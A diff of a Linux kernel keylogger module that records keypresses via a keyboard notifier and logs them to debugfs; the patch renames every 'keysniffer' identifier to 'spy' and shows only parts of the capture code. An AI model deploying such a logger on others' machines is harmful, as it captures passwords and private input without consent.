@@ -15,7 +15,7 @@
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
- * along with keysniffer. If not, see <http://www.gnu.org/licenses/>.
+ * along with spy. If not, see <http://www.gnu.org/licenses/>.
  */
 
 #include <linux/init.h>
@@ -32,14 +32,14 @@
 #define HEX 1 /* Type code for hexadecimal log */
 #define DEC 2 /* Type code for decimal log */
 
-#define KEYSNIFFER_VERSION "1.7"
+#define SPY_VERSION "1.7"
 
 /* User specified log pattern, used as a module parameter */
 static int codes;
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
-MODULE_VERSION(KEYSNIFFER_VERSION);
+MODULE_VERSION(SPY_VERSION);
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
 
 /* Register global variable @codes as a module parameter with type and permissions */
@@ -56,7 +56,7 @@ static ssize_t keys_read(struct file *filp,
 		size_t len,
 		loff_t *offset);
 
-static int keysniffer_cb(struct notifier_block *nblock,
+static int spy_cb(struct notifier_block *nblock,
 		unsigned long code,
 		void *_param);
 
@@ -122,8 +122,8 @@ static ssize_t keys_read(struct file *filp,
 	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
 
-static struct notifier_block keysniffer_blk = {
-	.notifier_call = keysniffer_cb,
+static struct notifier_block spy_blk = {
+	.notifier_call = spy_cb,
 };
 
 /**
@@ -158,12 +158,12 @@ void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
 }
 
 /**
- * keysniffer_cb - keypress callback, called when a keypress
+ * spy_cb - keypress callback, called when a keypress
  * event occurs. Ref: @notifier_block structure.
  *
  * Returns NOTIFY_OK
  */
-int keysniffer_cb(struct notifier_block *nblock,
+int spy_cb(struct notifier_block *nblock,
 		  unsigned long code,
 		  void *_param)
 {
@@ -201,7 +201,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 }
 
 /**
- * keysniffer_init - module entry point
+ * spy_init - module entry point
  *
  * Creates required debugfs directory and files
  * Registers the keyboard structure @notifier_block
@@ -209,7 +209,7 @@ int keysniffer_cb(struct notifier_block *nblock,
  * Returns 0 on successful initialization, otherwise
  * the appropriate error code in case of any error
  */
-static int __init keysniffer_init(void)
+static int __init spy_init(void)
 {
 	if (codes < 0 || codes > 2)
 		return -EINVAL;
@@ -228,24 +228,24 @@ static int __init keysniffer_init(void)
 
 	/*
 	 * Add to the list of console keyboard event
-	 * notifiers so the callback keysniffer_cb is
-	 * called when an event occurs.
+	 * notifiers so the callback spy_cb is called
+	 * when an event occurs.
 	 */
-	register_keyboard_notifier(&keysniffer_blk);
+	register_keyboard_notifier(&spy_blk);
 	return 0;
 }
 
 /**
- * keysniffer_exit - module exit function
+ * spy_exit - module exit function
  *
  * Unregisters the module from the kernel
  * Cleans up the debugfs directory to log keys
  */
-static void __exit keysniffer_exit(void)
+static void __exit spy_exit(void)
 {
-	unregister_keyboard_notifier(&keysniffer_blk);
+	unregister_keyboard_notifier(&spy_blk);
 	debugfs_remove_recursive(subdir);
 }
 
-module_init(keysniffer_init);
-module_exit(keysniffer_exit);
+module_init(spy_init);
+module_exit(spy_exit);
